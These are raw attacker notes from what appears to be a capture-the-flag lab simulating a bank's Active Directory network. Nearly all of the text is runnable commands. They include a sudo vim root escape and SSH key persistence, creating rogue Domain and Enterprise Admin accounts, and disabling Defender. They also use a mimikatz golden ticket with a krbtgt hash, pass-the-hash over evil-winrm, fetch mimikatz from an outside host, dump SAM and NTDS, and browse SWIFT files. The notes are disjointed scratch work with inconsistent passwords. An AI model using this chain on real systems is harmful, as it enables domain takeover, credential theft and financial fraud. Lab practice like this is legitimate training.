
# setup

## /etc/hosts

```shell
SubNetId=118
echo "10.200.${SubNetId}.11    thereserve-mail.thm mail.thereserve.loc" >> /etc/hosts
echo "10.200.${SubNetId}.12    thereserve-vpn.thm" >> /etc/hosts
echo "10.200.${SubNetId}.13    thereserve-web.thm" >> /etc/hosts
```

## setup openvpn DMZ -> internal network

```shell
wget -q http://thereserve-vpn.thm/vpn/corpUsername.ovpn -O corpUsername.ovpn
sed "s/remote 10.200.X.X 1194/remote 10.200.121.12 1194\\nroute 10.200.121.21 255.255.255.255\\nroute 10.200.121.22 255.255.255.255/" corpUsername.ovpn > corpUsername-118.ovpn
openvpn corpUsername-118.ovpn
```

```shell
firefox http://thereserve-web.thm/october/index.php/backend/backend/auth/signin &
# admin : password1!

nc -nvlp 8888


sudo /usr/bin/vim -c :!/bin/bash
cat <<EOF >> /home/ubuntu/.ssh/authorized_keys
ssh-rsa <Your Private Key Here> mentalyDisturbed
EOF
```

```shell
cd breaching
ssh -D 1080 ubuntu@thereserve-web.thm -i ./web-key  -N
```

## to corpdc

gem install evil-winrm
unalias evil-winrm

proxychains evil-winrm -i 10.200.118.102 -u Administrator -H d3d4edcc015856e386074795aea86b3e

```
net user d1sturb3d /add M3nta11y /domain
net group "Domain Admins" d1sturb3d /add /domain
```

```
Set-MpPreference -DisableRealtimeMonitoring $true
upload mimikatz.exe
upload PsExec64.exe
```

proxychains xfreerdp /u:d1sturb3d /p:M3nta11y /d:corp.thereserve.loc /v:10.200.118.102

In RDP :
cd C:\Users\Administrator\Documents\
./mimikatz.exe "privilege::debug" "kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024-1009 /service:krbtgt /rc4:0c757a3445acb94a654554f3ac529ede /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /ptt" "exit"
```


./psexec64.exe \\rootdc.thereserve.loc -s powershell.exe -accepteula

```
net user d1sturb3d /add M3nta11y /domain
net group "Domain Admins" d1sturb3d /add /domain
net group "Enterprise Admins" d1sturb3d /add /domain
```

exit RDP on corpdc

proxychains xfreerdp /u:d1sturb3d /p:M3nta11y /d:thereserve.loc /v:10.200.118.101


```
net user d1sturb3d /add M3nta11y
net group "Domain Admins" d1sturb3d /add /domain
```

close RDP and reopen with :


proxychains xfreerdp /u:d1sturb3d /p:M3nta11y /d:bank.thereserve.loc /v:10.200.118.101

open a RDP to JMP: 
- host: 10.200.118.61
- user : d1sturb3d
- passwword: M3nta11y


















```powershell
$username = "d1sturb3d"
$domain = "corp.thereserve.loc"
$password = ConvertTo-SecureString -String "M3nta11y" -AsPlainText -Force

$newUser = New-ADUser -SamAccountName "$username" -UserPrincipalName "$username@$domain" -Name "$username" -GivenName "$username" -Surname "User" -DisplayName "$username" -Enabled $true -AccountPassword $password -ChangePasswordAtLogon $false

$domainAdminsGroup = "Domain Admins"
$newUser = get-aduser -identity $username
Add-ADGroupMember -Identity $domainAdminsGroup -Members $newUser
```
or

```
net user d1sturb3d /add M3nta11y /domain
net group "Domain Admins" d1sturb3d /add /domain
net group "Enterprise Admins" d1sturb3d /add /domain
```



proxychains xfreerdp /u:d1sturb3d /p:M3nta11y /d:corp.thereserve.loc /v:10.200.118.102
proxychains xfreerdp /u:d1sturb3d /p:M3nta11y /d:thereserve.loc /v:10.200.118.100
proxychains xfreerdp /u:d1sturb3d /p:M3nta11y /d:bank.thereserve.loc /v:10.200.118.101



user is now enterprise admin from thereserve.loc

cp /opt/resources/windows/impacket-examples-windows/psexec.exe .
upload psexec.exe



```powershell
Import-Module ActiveDirectory
$username = "d1sturb3d"
$domain = "corp.thereserve.loc"
$password = ConvertTo-SecureString -String "M3ta11y" -AsPlainText -Force

$newUser = New-ADUser -SamAccountName "$username" -UserPrincipalName "$username@$domain" -Name "$username" -GivenName "$username" -Surname "User" -DisplayName "$username" -Enabled $true -AccountPassword $password -ChangePasswordAtLogon $false -Server $domain

$domainAdminsGroup = "Domain Admins"
$newUser = get-aduser -identity $username -Server $domain
Add-ADGroupMember -Identity $domainAdminsGroup -Members $newUser


get-adgroupmember "Enterprise Admins" -Server thereserve.loc

$user = get-aduser -identity $username -Server $domain
Add-ADGroupMember -Identity "Enterprise Admins" -Members $user -Server thereserve.loc



$username = "d1sturb3d"
$domain = "bank.thereserve.loc"
$password = ConvertTo-SecureString -String "M3ta11y" -AsPlainText -Force

$newUser = New-ADUser -SamAccountName "$username" -UserPrincipalName "$username@$domain" -Name "$username" -GivenName "$username" -Surname "User" -DisplayName "$username" -Enabled $true -AccountPassword $password -ChangePasswordAtLogon $false -Server $domain
Add-ADGroupMember -Identity "Domain Admins" -Members $user -Server bank.thereserve.loc
```


 Get-ADUser -filter * -server bank.thereserve.loc


Invoke-Command -ComputerName rootdc.thereserve.loc -ScriptBlock { whoami }

mstsc /v:10.200.118.100

./psexec.exe \\rootdc.thereserve.loc cmd.exe
./psexec.exe \\rootdc cmd.exe
./psexec.exe /?


wget https://download.sysinternals.com/files/PSTools.zip
unzip PSTools.zip
upload PsExec.exe

./psexec.exe \\rootdc.thereserve.loc cmd.exe
./psexec.exe \\rootdc.thereserve.loc powershell.exe

OK connected on rootDC



$username = "d1sturb3d"
$domain = "thereserve.loc"
$password = ConvertTo-SecureString -String "M3nta11y" -AsPlainText -Force

$newUser = New-ADUser -SamAccountName "$username" -UserPrincipalName "$username@$domain" -Name "$username" -GivenName "$username" -Surname "User" -DisplayName "$username" -Enabled $true -AccountPassword $password -ChangePasswordAtLogon $false
Add-ADGroupMember -Identity "Domain Admins" -Members $user -Server bank.thereserve.loc


```
net user d1sturb3d /add M3nta11y
net group "Domain Admins" d1sturb3d /add /domain
```



./psexec.exe \\rootdc.thereserve.loc net user d1sturb3d /add "M3ta11y@"
./psexec.exe \\rootdc.thereserve.loc gpresult /scope computer /v


cd C:\Users\Administrator\Documents\
start-bitstransfer -source http://10.50.115.95:9090/mimikatz.exe -destination mimikatz.exe


$exclusionPath = "C:\Users\Administrator\Documents\"
Add-MpPreference -ExclusionPath $exclusionPath


Get-ObjectAcl -DistinguishedName "dc=thereserve,dc=loc" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}




 ./psexec.exe \\bankdc.bank.thereserve.loc powershell.exe

 works !!!


hostname
$user = get-aduser -identity Administrator -Server corp.thereserve.loc
$user
Add-ADGroupMember -Identity "Domain Admins" -Members $user
hostname

get-adgroup "Domain Admins"
get-adgroupmember "Domain Admins"


https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets

reg save hklm\sam C:\SAM
reg save hklm\system C:\SYSTEM
reg save hklm\security C:\SECURITY

 cp \\rootdc.thereserve.loc\c$/SAM .
  cp \\rootdc.thereserve.loc\c$/SYSTEM .
  cp \\rootdc.thereserve.loc\c$/SECURITY .

download SAM
download SYSTEM
download SECURITY

https://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html

samdump2 SYSTEM SAM 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* ä:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::




powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\' q q"



.\PsExec64.exe \\rootdc.thereserve.loc -s cmd.exe

```
net user d1sturb3d /add M3nta11y
net group "Domain Admins" d1sturb3d /add /domain
```

proxychains secretsdump.py 'thereserve.loc/d1sturb3d:M3nta11y'@10.200.118.100 -outputfile rootdc.hashes

failed

psexec.py thereserve.loc/d1sturb3d:M3nta11y@10.200.118.100 cmd.exe
=> timeout

on corpdc : remote desktop to rootdc => not authorized

ls \\work1.bank.thereserve.loc\C$\Users
a.barker
g.watson
t.buckley

ls \\work1.bank.thereserve.loc\C$\Users\a.barker\Documents\Swift
-a----        2/19/2023   8:39 AM            303 Swift.txt
Get-content -path \\work1.bank.thereserve.loc\C$\Users\a.barker\Documents\Swift\Swift.txt


ls \\work1.bank.thereserve.loc\C$\Users\g.watson\Documents\Swift
-a----        2/19/2023   8:44 AM            341 swift.txt
Get-content -path \\work1.bank.thereserve.loc\C$\Users\g.watson\Documents\Swift\Swift.txt


ls \\work1.bank.thereserve.loc\C$\Users\t.buckley\Documents\Swift
-a----        2/19/2023   8:45 AM            303 swift.txt
-a----        4/25/2023   5:39 PM            387 swiftlogs.txt
Get-content -path \\work1.bank.thereserve.loc\C$\Users\t.buckley\Documents\Swift\Swift.txt
```
Welcome capturer to the SWIFT team.

You're credentials have been activated. For ease, your most recent AD password was replicated to the SWIFT application. Please feel free to change this password should you deem it necessary.

You can access the SWIFT system here: http://swift.bank.thereserve.loc
```

Get-content -path \\work1.bank.thereserve.loc\C$\Users\t.buckley\Documents\Swift\swiftlogs.txt

ls \\work2.bank.thereserve.loc\C$\Users
c.young
s.harding

ls \\work2.bank.thereserve.loc\C$\Users\c.young\Documents\Swift
303 swift.txt
Get-content -path \\work2.bank.thereserve.loc\C$\Users\c.young\Documents\Swift\swift.txt

ls \\work2.bank.thereserve.loc\C$\Users\s.harding\Documents\Swift
-a----        2/19/2023   8:52 AM            303 Swift.txt
-a----        4/15/2023   7:28 PM            384 swiftlogs.tx
Get-content -path \\work2.bank.thereserve.loc\C$\Users\s.harding\Documents\Swift\swift.txt
```
Welcome capturer to the SWIFT team.

You're credentials have been activated. For ease, your most recent AD password was replicated to the SWIFT application. Please feel free to change this password should you deem it necessary.

You can access the SWIFT system here: http://swift.bank.thereserve.loc
```

Get-content -path \\work2.bank.thereserve.loc\C$\Users\s.harding\Documents\Swift\swiftlogs.txt

ls \\jmp.bank.thereserve.loc\C$\Users
a.holt
a.turner

ls '\\jmp.bank.thereserve.loc\C$\Users\a.holt\Documents\Swift\'
242 swift.txt
Get-content -path \\jmp.bank.thereserve.loc\C$\Users\a.holt\Documents\Swift\swift.txt



ls '\\jmp.bank.thereserve.loc\C$\Users\a.turner\Documents\'
nothing


